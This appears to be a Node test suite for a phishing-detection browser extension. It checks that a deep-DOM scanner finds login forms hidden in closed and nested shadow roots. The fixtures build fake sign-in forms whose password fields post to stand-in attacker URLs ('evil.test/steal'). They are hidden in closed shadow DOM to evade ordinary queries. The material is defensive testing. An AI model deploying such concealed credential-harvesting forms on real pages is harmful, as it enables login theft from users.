import assert from "node:assert/strict";
import fs from "node:fs";
import test from "node:test";
import vm from "node:vm";
import { JSDOM } from "jsdom";

function createDom(html, url) {
  return new JSDOM(html, { url: url, runScripts: "dangerously" });
}

function loadApi(dom, closedRoots) {
  const context = dom.getInternalVMContext();
  context.chrome = {
    dom: {
      openOrClosedShadowRoot(element) {
        return closedRoots.get(element) || null;
      },
    },
  };
  const source = fs.readFileSync(
    new URL("../scripts/deep-dom.js", import.meta.url),
    "utf8"
  );
  vm.runInContext(source, context);
  return context.checkDeepDom;
}

function trackClosedShadows(window) {
  const closedRoots = new WeakMap();
  const original = window.Element.prototype.attachShadow;
  window.Element.prototype.attachShadow = function attachShadow(init) {
    const root = original.call(this, init);
    if (init && init.mode === "closed") closedRoots.set(this, root);
    return root;
  };
  return closedRoots;
}

test("closed shadow login form is invisible to light-DOM queries and visible to deep scan", () => {
  const dom = createDom(
    "<!DOCTYPE html><html><body><div id='host'></div></body></html>",
    "https://phish.test/login"
  );
  const closedRoots = trackClosedShadows(dom.window);
  const host = dom.window.document.getElementById("host");
  const shadow = host.attachShadow({ mode: "closed" });
  shadow.innerHTML = `
    <form method="post" action="https://evil.test/steal">
      <input name="loginfmt" id="i0116">
      <input name="idPartnerPL">
      <input type="password" name="passwd">
    </form>
  `;

  const lightHtml = dom.window.document.documentElement.outerHTML;
  assert.equal(lightHtml.includes("loginfmt"), false);
  assert.equal(lightHtml.includes("passwd"), false);
  assert.equal(dom.window.document.querySelector("form"), null);
  assert.equal(dom.window.document.querySelector('input[type="password"]'), null);
  assert.equal(host.shadowRoot, null);

  const api = loadApi(dom, closedRoots);
  const source = api.getDeepPageSource(dom.window.document);
  assert.equal(source.includes("loginfmt"), true);
  assert.equal(source.includes("idPartnerPL"), true);
  assert.equal(api.getDeepPageText(dom.window.document).includes("loginfmt"), false);

  const forms = api.queryAllDeep(dom.window.document, "form");
  assert.equal(forms.length, 1);
  assert.equal(
    api.queryAllDeep(forms[0], 'input[type="password"]').length,
    1
  );
  assert.equal(forms[0].action, "https://evil.test/steal");
  assert.equal(api.listShadowRoots(dom.window.document).length, 1);
});

test("nested closed shadow roots are included", () => {
  const dom = createDom(
    "<!DOCTYPE html><html><body><div id='outer'></div></body></html>",
    "https://phish.test/nested"
  );
  const closedRoots = trackClosedShadows(dom.window);
  const outer = dom.window.document.getElementById("outer");
  const outerShadow = outer.attachShadow({ mode: "closed" });
  const innerHost = dom.window.document.createElement("div");
  outerShadow.appendChild(innerHost);
  const innerShadow = innerHost.attachShadow({ mode: "closed" });
  innerShadow.innerHTML =
    '<form action="https://evil.test/nested"><input type="password" name="passwd"></form>';

  const api = loadApi(dom, closedRoots);
  assert.equal(api.listShadowRoots(dom.window.document).length, 2);
  const forms = api.queryAllDeep(dom.window.document, "form");
  assert.equal(forms.length, 1);
  assert.equal(forms[0].action, "https://evil.test/nested");
  assert.match(api.getDeepPageSource(dom.window.document), /passwd/);
});

test("open shadow roots are read without the closed-root API", () => {
  const dom = createDom(
    "<!DOCTYPE html><html><body><div id='host'></div></body></html>",
    "https://phish.test/open"
  );
  const host = dom.window.document.getElementById("host");
  const shadow = host.attachShadow({ mode: "open" });
  shadow.innerHTML = '<input type="password" name="passwd">';

  const context = dom.getInternalVMContext();
  context.chrome = {};
  vm.runInContext(
    fs.readFileSync(new URL("../scripts/deep-dom.js", import.meta.url), "utf8"),
    context
  );

  const inputs = context.checkDeepDom.queryAllDeep(
    dom.window.document,
    'input[type="password"]'
  );
  assert.equal(inputs.length, 1);
  assert.equal(dom.window.document.querySelector('input[type="password"]'), null);
});

test("manifest injects the deep DOM helper into opaque child frames", () => {
  const manifest = JSON.parse(
    fs.readFileSync(new URL("../manifest.json", import.meta.url), "utf8")
  );
  const contentScript = manifest.content_scripts[0];
  assert.deepEqual(contentScript.js, [
    "scripts/deep-dom.js",
    "scripts/content.js",
  ]);
  assert.equal(contentScript.all_frames, true);
  assert.equal(contentScript.match_about_blank, true);
  assert.equal(contentScript.match_origin_as_fallback, true);
  for (const pattern of contentScript.matches) {
    assert.equal(pattern.endsWith("/*"), true);
  }

  const content = fs.readFileSync(
    new URL("../scripts/content.js", import.meta.url),
    "utf8"
  );
  assert.match(content, /function getPageSource\(/);
  assert.match(content, /function queryAll\(/);
  assert.match(content, /function formMatches\(/);
  assert.match(content, /bypassScanCap/);
});
